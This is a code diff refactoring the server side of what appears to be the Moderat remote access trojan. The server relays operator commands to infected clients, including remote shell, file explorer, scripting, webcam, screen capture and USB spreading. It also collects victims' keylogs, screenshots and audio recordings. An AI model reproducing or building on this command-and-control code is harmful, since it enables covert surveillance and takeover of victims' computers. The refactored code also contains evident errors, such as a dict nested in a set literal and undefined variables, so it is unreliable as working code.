@@ -28,14 +28,14 @@ class ModeratServerProtocol(LineReceiver):
 
     # New Connection Made
     def connectionMade(self):
-        self.send_message(self, 'connectSuccess', 'connectSuccess')
+        self.sendMessage(self, 'connectSuccess', 'connectSuccess')
 
     def connectionLost(self, reason):
         self.transport.abortConnection()
 
-        # Delete Socket Entry
+        # Delete Client Entry
         for key, value in self.factory.clients.items():
-            if value['socket'] == self:
+            if value['protocol'] == self:
                 self.factory.database.setClientStatus(key, False)
                 del self.factory.clients[key]
                 self.factory.log.warning('[CLIENT] Client (%s) Disconnected' % (value['key'] if value.has_key('key') else 'UNKNOWN'))
@@ -43,7 +43,7 @@ class ModeratServerProtocol(LineReceiver):
         # Delete Moderator Entry
         try:
             for key, value in self.factory.moderators.items():
-                if value['socket'] == self:
+                if value['protocol'] == self:
                     # Set Moderator Offline
                     self.factory.database.setModeratorLastOnline(value['username'])
                     self.factory.database.setModeratorStatus(value['username'], False)
@@ -61,139 +61,73 @@ class ModeratServerProtocol(LineReceiver):
         except SyntaxError:
             return
 
-        # Switch to client commands
+        self.payload = command['payload']
+        self.mode = command['mode']
+        self.sessionID = command['session_id']
+        self.moduleID = command['module_id']
+
         if command['from'] == 'client':
-            if not command['mode'] == 'infoChecker':
-                self.factory.log.info('[*RECV] [Client: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
-            if command.has_key('module_id'):
-                client.CheckCommand(self, command['payload'], command['mode'], command['session_id'], command['key'],
-                                     command['module_id'])
-            else:
-                client.CheckCommand(self, command['payload'], command['mode'], command['session_id'], command['key'], '')
-        # Switch to moderator commands
+            # TODO: CLient Commands
+            pass
         elif command['from'] == 'moderator':
             if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
                 self.factory.log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
-            self.moderator_commands(command['payload'], command['mode'], command['session_id'], command['to'],
-                                    command['module_id'])
+            self.moderatorCommands()
 
     # Moderator Commands
-    def moderator_commands(self, payload, mode, session_id, client_key, module_id):
-        if mode == 'moderatorInitializing':
-
-            # Initializing Moderator
+    def moderatorCommands(self):
+        if self.mode == 'moderatorInitializing':
             self.factory.log.debug('[MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
-            if payload.startswith('auth '):
-                credentials = payload.split()
+            if self.payload.startswith('auth '):
+                credentials = self.payload.split()
                 if len(credentials) == 3:
-                    command, username, password = payload.split()
-
-                    # If Login Success
+                    command, username, password = credentials
                     if self.factory.database.loginModerator(username, password):
-                        privileges = self.factory.database.getPrivileges(username)
-                        self.send_message(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')
-                        self.factory.moderators[session_id] = {'username': username, 'socket': self}
+                        privileges = self.factory.database.isAdministrator(username)
+                        self.sendMessage(self, 'loginSuccess %s' % privileges)
+                        self.factory.moderators[self.sessionID] = {'username': username, 'protocol': self}
                         self.factory.database.setModeratorLastOnline(username)
                         self.factory.database.setModeratorStatus(username, True)
-
                         self.factory.log.debug('[MODERATOR] Moderator (%s) Login Success' % username)
-
-                    # if Login Not Success
                     else:
-                        self.send_message(self, 'loginError', 'moderatorInitializing')
+                        self.sendMessage(self, 'loginError')
                         self.factory.log.error('[MODERATOR] Moderator (%s) Login Error' % username)
-
                 else:
                     self.factory.log.critical('[MALFORMED] Moderator Login Data')
 
-        # Initialized Moderator
-        elif self.factory.moderators.has_key(session_id):
-
-            moderator_username = self.factory.moderators[session_id]['username']
-
-            if mode == 'getClients' and session_id in self.factory.moderators:
-
-                if self.factory.database.getPrivileges(moderator_username) == 1:
-                    clients_ids = []
-                    temp_clients_ids = self.factory.database.getAllClients()
-                    for client_id in temp_clients_ids:
-                        _id = client_id.identifier
-                        if self.factory.database.getPrivileges(self.factory.database.getClientModerator(
-                                _id)) == 0 or moderator_username == self.factory.database.getClientModerator(_id):
-                            clients_ids.append(client_id)
-                else:
-                    clients_ids = self.factory.database.getClients(moderator_username)
-                shared_clients = {}
-
-                # for online clients
-                for client_id in clients_ids:
-                    _id = client_id[0]
-                    # Online Clients
-                    if self.factory.clients.has_key(_id) and self.factory.clients[_id].has_key('os_type'):
-                        shared_clients[_id] = {
-                            'moderator': self.factory.database.getClientModerator(_id),
-                            'alias': self.factory.database.getClientAlias(_id),
-                            'ip_address': self.factory.clients[_id]['ip_address'],
-                            'os_type': self.factory.clients[_id]['os_type'],
-                            'os': self.factory.clients[_id]['os'],
-                            'user': self.factory.clients[_id]['user'],
-                            'privileges': self.factory.clients[_id]['privileges'],
-                            'audio_device': self.factory.clients[_id]['audio_device'],
-                            'webcamera_device': self.factory.clients[_id]['webcamera_device'],
-                            'window_title': self.factory.clients[_id]['window_title'],
-                            'key': self.factory.clients[_id]['key'],
-                            'kts': self.factory.clients[_id]['kts'],
-                            'kt': self.factory.clients[_id]['kt'],
-                            'ats': self.factory.clients[_id]['ats'],
-                            'at': self.factory.clients[_id]['at'],
-                            'sts': self.factory.clients[_id]['sts'],
-                            'std': self.factory.clients[_id]['std'],
-                            'st': self.factory.clients[_id]['st'],
-                            'usp': self.factory.clients[_id]['usp'],
-                            'status': True
-                        }
-                    # Offline Clients
-                    else:
-                        shared_clients[_id] = {
-                            'moderator': self.factory.database.getClientModerator(_id),
-                            'key': _id,
-                            'alias': self.factory.database.getClientAlias(_id),
-                            'ip_address': self.factory.database.getClientIPAddress(_id),
-                            'last_online': self.factory.database.getClientLastOnline(_id),
-                            'status': False
-                        }
-                self.send_message(self, shared_clients, 'getClients')
+        elif self.factory.moderators.has_key(self.sessionID):
+            moderator = self.factory.database.getModerator(self.factory.moderators[self.sessionID]['username'])
 
             # Note Save Mode
-            elif mode == 'saveNote':
-                splitted = payload.split('%SPLITTER%')
+            if self.mode == 'saveNote':
+                splitted = self.payload.split('%SPLITTER%')
                 if len(splitted) == 2:
                     client_id, note_body = splitted
                     self.factory.database.setClientNote(client_id, note_body)
 
             # Get Note
-            elif mode == 'getNote':
-                self.send_message(self, '{}'.format(self.factory.database.getClientNote(payload)), mode, module_id=module_id)
+            elif self.mode == 'getNote':
+                self.sendMessage(self, '{}'.format(self.factory.database.getClientNote(self.payload)))
 
             # Set Alias For Client
-            elif mode == 'setAlias':
-                alias_data = payload.split()
+            elif self.mode == 'setAlias':
+                alias_data = self.payload.split()
                 try:
                     alias_client = alias_data[0]
                     alias_value = u' '.join(alias_data[1:])
-                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator_username, alias_value,
+                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator.username, alias_value,
                                                                                    self.transport.getPeer().host))
                     self.factory.database.set_alias(alias_client, alias_value)
                 except:
-                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator_username, mode))
+                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
 
-            elif mode == 'removeClient':
-                client = payload
+            elif self.mode == 'removeClient':
+                client = self.payload
                 self.factory.database.delete_client(client)
-                self.factory.log.debug('[MODERATOR][{0}] Client ({1}) Removed'.format(moderator_username, client))
+                self.factory.log.debug('[MODERATOR][{0}] Client ({1}) Removed'.format(moderator.username, client))
 
-            elif mode == 'countData':
-                screen_data = payload.split()
+            elif self.mode == 'countData':
+                screen_data = self.payload.split()
                 if len(screen_data) == 2:
                     client_id, date = screen_data
                     counted_data = {
@@ -211,13 +145,13 @@ class ModeratServerProtocol(LineReceiver):
                         }
                     }
 
-                    self.send_message(self, counted_data, mode, module_id=module_id)
+                    self.sendMessage(self, counted_data)
                 else:
-                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator_username, mode))
+                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
 
-            elif mode == 'downloadLogs':
+            elif self.mode == 'downloadLogs':
                 if type(payload) == dict:
-                    download_info = payload
+                    download_info = self.payload
                     # Get All Logs
                     if download_info['screenshot']:
                         screenshots = self.factory.database.get_all_new_screenshots(download_info['client_id'],
@@ -245,7 +179,7 @@ class ModeratServerProtocol(LineReceiver):
                         'keylogs': len(keylogs),
                         'audios': len(audios),
                     }
-                    self.send_message(self, counted_logs, mode, module_id=module_id)
+                    self.sendMessage(self, counted_logs)
 
                     # Start Send Screenshots
                     for screenshot in screenshots:
@@ -257,7 +191,7 @@ class ModeratServerProtocol(LineReceiver):
                                 'window_title': screenshot[3],
                                 'date': screenshot[4]
                             }
-                            self.send_message(self, screenshot_info, 'downloadLog', module_id=module_id)
+                            self.sendMessage(self, screenshot_info, 'downloadLog')
                             self.factory.database.set_screenshot_viewed(screenshot[1])
                         else:
                             self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
@@ -272,7 +206,7 @@ class ModeratServerProtocol(LineReceiver):
                                 'date': keylog[2],
                                 'raw': open(keylog[3], 'rb').read()
                             }
-                            self.send_message(self, keylog_info, 'downloadLog', module_id=module_id)
+                            self.sendMessage(self, keylog_info, 'downloadLog')
                             self.factory.database.set_keylog_viewed(keylog[1])
                         else:
                             self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % keylog[3])
@@ -287,102 +221,83 @@ class ModeratServerProtocol(LineReceiver):
                                 'date': audio[2],
                                 'raw': open(audio[3], 'rb').read()
                             }
-                            self.send_message(self, audio_info, 'downloadLog', module_id=module_id)
+                            self.sendMessage(self, audio_info, 'downloadLog')
                             self.factory.database.set_audio_viewed(audio[1])
                         else:
                             self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % audio[3])
                             self.factory.database.delete_audios(audio[1])
 
-                    self.send_message(self, {'type': 'endDownloading', }, 'downloadLog', module_id=module_id)
+                    self.sendMessage(self, {'type': 'endDownloading', }, 'downloadLog')
                 else:
                     self.factory.log.critical('[MALFORMED][TYPE] [MODE: {0}] [TYPE: {1}]'.format(mode, type(payload)))
 
-            # Get Moderators List
-            elif mode == 'getModerators' and self.factory.database.getPrivileges(moderator_username) == 1:
-                all_moderators = self.factory.database.getModerators()
-                result = {}
-                for moderator in all_moderators:
-                    all_clients_count = self.factory.database.getClients(moderator.username).count()
-                    offline_clients_count = self.factory.database.getOfflineClients(moderator.username).count()
-                    result[moderator.username] = {
-                        'privileges': moderator.privileges,
-                        'offline_clients': offline_clients_count,
-                        'online_clients': all_clients_count - offline_clients_count,
-                        'status': moderator.status,
-                        'last_online': moderator.last_online.strftime("%Y-%m-%d %H:%M:%S"),
-                    }
-                self.send_message(self, result, 'getModerators')
-
             # ADMIN PRIVILEGES
             # Add Moderator
-            elif mode == 'addModerator' and self.factory.database.getPrivileges(moderator_username) == 1:
-                credentials = payload.split()
-                if len(credentials) == 3:
+            elif self.mode == 'addModerator' and self.factory.database.isAdministrator(moderator.username):
+                credentials = self.payload.split()
+                if len(credentials) == 3 and credentials[2].isdigit():
                     username, password, privileges = credentials
                     self.factory.database.createModerator(username, password, int(privileges))
                     self.factory.log.debug('[MODERATOR][{0}] ({1}) Created With Password: ({2}), Privileges: ({3})'.format(
-                        moderator_username, username, password.replace(password[3:], '***'), privileges))
+                        moderator.username, username, password.replace(password[3:], '***'), privileges))
 
-            elif mode == 'setModerator' and self.factory.database.get_privs(moderator_username) == 1:
-                credentials = payload.split()
+            elif self.mode == 'setModerator' and self.factory.database.isAdministrator(moderator.username):
+                credentials = self.payload.split()
                 if len(credentials) == 2:
                     client_id, moderator_id = credentials
                     self.factory.database.setClientModerator(client_id, moderator_id)
                     self.factory.log.debug('[MODERATOR][{0}] Moderator Changed For Client ({1}) to ({2})'.format(
-                        moderator_username, client_id, moderator_id))
+                        moderator.username, client_id, moderator_id))
 
-            elif mode == 'changePassword' and self.factory.database.get_privs(moderator_username) == 1:
-                credentials = payload.split()
+            elif self.mode == 'changePassword' and self.factory.database.get_privs(moderator.username) == 1:
+                credentials = self.payload.split()
                 if len(credentials) == 2:
                     moderator_id, new_password = credentials
                     self.factory.database.change_password(moderator_id, new_password)
                     self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Password Changed to ({2})'.format(
-                        moderator_username, moderator_id, new_password.replace(new_password[3:], '***')))
+                        moderator.username, moderator_id, new_password.replace(new_password[3:], '***')))
 
-            elif mode == 'changePrivilege' and self.factory.database.get_privs(moderator_username) == 1:
-                credentials = payload.split()
+            elif self.mode == 'changePrivilege' and self.factory.database.isAdministrator(moderator.username):
+                credentials = self.payload.split()
                 if len(credentials) == 2:
                     moderator_id, new_privilege = credentials
-                    self.factory.database.change_privileges(moderator_id, new_privilege)
+                    self.factory.database.changePrivileges(moderator_id, new_privilege)
                     self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Privilege Changed to ({2})'.format(
-                        moderator_username, moderator_id, new_privilege))
+                        moderator.username, moderator_id, new_privilege))
 
-            elif mode == 'removeModerator' and self.factory.database.get_privs(moderator_username) == 1:
-                moderator_id = payload
-                self.factory.database.delete_user(moderator_id)
+            elif self.mode == 'removeModerator' and self.factory.database.isAdministrator(moderator.username):
+                self.factory.database.deleteModerator(self.payload)
                 self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Removed'.format(
-                    moderator_username, moderator_id))
+                    moderator.username, self.payload))
 
             # For Only Administrators
-            elif mode in ['terminateClient'] and self.factory.database.get_privs(moderator_username) == 1:
-                self.send_message(self.factory.clients[client_key]['socket'], payload, mode,
-                                            session_id=session_id)
+            elif self.mode in ['terminateClient'] and self.factory.database.get_privs(moderator.username) == 1:
+                self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)
 
             # Forward To Client
-            elif mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
+            elif self.mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
                           'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                 try:
-                    self.send_message(self.factory.clients[client_key]['socket'], payload, mode,
-                                                session_id=session_id, module_id=module_id)
+                    self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)
                 except KeyError as e:
                     pass
             else:
-                self.factory.log.critical('[MALFORMED][MODE] [MODE: {0}] [MODERATOR: {1}]'.format(moderator_username, mode))
+                self.factory.log.critical('[MALFORMED][MODE] [MODE: {0}] [MODERATOR: {1}]'.format(self.mode, moderator.username))
         else:
-            self.factory.log.critical('[MALFORMED][SESSION] [MODE: {0}] [SESSION: {1}]'.format(mode, session_id))
+            self.factory.log.critical('[MALFORMED][SESSION] [MODE: {0}] [SESSION: {1}]'.format(self.mode, self.session_id))
 
-    # Send Message To Client
-    def send_message(self, to, message, mode, session_id='', module_id='', end='[ENDOFMESSAGE]'):
-        # Send Data Function
-        to.transport.write(str({
+    def sendMessage(self, to, message, mode='', sessionID='', moduleID=''):
+        toAddress = to.transport.getPeer().host
+        fromAddress = self.transport.getPeer().host
+        to.sendLine(str({
             'payload': message,
-            'mode': mode,
             'from': 'server',
-            'session_id': session_id,
-            'module_id': module_id,
-        }) + end)
+            'mode': self.mode if hasattr(self, 'mode') else mode,
+            'session_id': self.sessionID if hasattr(self, 'sessionID') else sessionID,
+            'module_id': self.moduleID if hasattr(self, 'moduleID') else moduleID,
+        }))
         self.factory.log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (
-        to.transport.getPeer().host, self.transport.getPeer().host, mode))
+            toAddress, fromAddress, self.mode if hasattr(self, 'mode') else 'UNKNOUN'))
 
 
 class ModeratServerFactory(ServerFactory):
@@ -405,15 +320,65 @@ class ModeratServerFactory(ServerFactory):
 
     def __init__(self):
         self.clientInfoChecker = task.LoopingCall(self.infoChecker)
+        self.getClientsChecker = task.LoopingCall(self.clientsChecker)
+        self.getModeratorsChecker = task.LoopingCall(self.moderatorsChecker)
         self.clientInfoChecker.start(5)
+        self.getClientsChecker.start(5)
+        self.getModeratorsChecker.start(5)
 
-    def infoChecker(self, session_id='', module_id='', end='[ENDOFMESSAGE]'):
+    def infoChecker(self):
         for key in self.clients.keys():
-            client = self.clients[key]['socket']
-            client.transport.write(str({
-            'payload': 'infoChecker',
-            'mode': 'infoChecker',
-            'from': 'server',
-            'session_id': session_id,
-            'module_id': module_id,
-            }) + end)
+            self.sendMessage(self.clients[key]['protocol'], 'infoChecker', 'infoChecker', '', '')
+
+    def clientsChecker(self):
+        current_clients = self.clients
+        for session in self.moderators.keys():
+            shared_clients = {}
+            moderator = self.database.getModerator(self.moderators[session]['username'])
+            clients = self.database.getClients(moderator)
+            for client in clients:
+                if current_clients.has_key(client.identifier) and client.status:
+                    _ = current_clients[client.identifier]
+                    shared_clients[client.identifier] = {
+                        {
+                            'moderator': self.database.getClientModerator(client.identifier).username,
+                            'alias': self.database.getClientAlias(client.identifier),
+                            'ip_address': _['ip_address'], 'os_type': _['os_type'], 'os': _['os'],
+                            'user': _['user'], 'privileges': _['privileges'], 'audio_device': _['audio_device'],
+                            'webcamera_device': _['webcamera_device'], 'window_title': _['window_title'],
+                            'key': _['key'], 'kts': _['kts'], 'kt': _['kt'], 'ats': _['ats'], 'at': _['at'],
+                            'sts': _['sts'], 'std': _['std'], 'st': _['st'], 'usp': _['usp'],
+                            'status': client.status
+                        }
+                    }
+                else:
+                    shared_clients[client.identifier] = {
+                        'moderator': moderator.username,
+                        'key': client.identifier,
+                        'alias': client.alias,
+                        'ip_address': client.ip_address,
+                        'last_online': client.last_connected.strftime("%Y-%m-%d %H:%M:%S"),
+                        'status': client.status
+                    }
+            self.sendMessage(self.moderators[session]['protocol'], shared_clients, 'getClients', '', '')
+
+    def moderatorsChecker(self):
+        shared_moderators = {}
+        moderators = self.database.getModerators()
+        for moderator in moderators:
+            all_clients_count = self.database.getClients(moderator).count()
+            offline_clients_count = self.database.getOfflineClients(moderator).count()
+            shared_moderators[moderator.username] = {
+                'privileges': moderator.privileges,
+                'offline_clients': offline_clients_count,
+                'online_clients': all_clients_count - offline_clients_count,
+                'status': moderator.status,
+                'last_online': moderator.last_online.strftime("%Y-%m-%d %H:%M:%S"),
+            }
+        for session in self.moderators.keys():
+            self.sendMessage(self.moderators[session]['protocol'], shared_moderators, 'getModerators', '', '')
+
+    def sendMessage(self, to, payload, mode, sessionID, moduleID):
+        to.sendLine(str({
+            'payload': payload, 'mode': mode, 'from': 'server', 'session_id': sessionID, 'module_id': moduleID,
+        }))
